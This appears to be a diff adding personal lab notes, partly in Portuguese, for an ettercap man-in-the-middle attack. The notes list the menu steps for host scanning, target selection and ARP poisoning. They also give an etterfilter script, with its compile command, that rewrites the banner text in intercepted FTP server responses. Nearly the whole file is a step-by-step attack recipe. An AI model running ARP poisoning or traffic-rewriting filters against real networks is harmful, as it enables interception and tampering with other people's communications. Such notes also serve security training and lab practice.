@@ -1,0 +1,22 @@
+ip addr show dev eth0
+
+ettercap -C				--curses mode, [-G] for GTK
+#Dump to file
+#Sniff - Unified Sniff
+#Select interface
+#CTRL-S - hosts - scan for hosts	--if this doesnt works, change mask to 255.255.255.0 or something close to that
+#Hosts - Hosts list
+#Space key to select one, then 1/2 key to add it to target 1/2 
+#Targets - Current targets
+#Mitm - ARP Poisoning  			--s key to see statistics
+#Start - Stop Sniffing
+
+#Crie o arquivo /root/pftp_filter.src com o seguinte conteúdo:
+#Modifica o nome do servidor FTP
+if (tcp.src == 21 && search(DATA.data, "ProFTPD")) {
+replace("ProFTPD", "ProFTP Hacked!");
+}
+etterfilter /root/pftp_filter.src -o /root/pftp_filter.fil
+#Filters - Load a filter...
+#Add pftp_filter.fil
+#Execute mitm attack
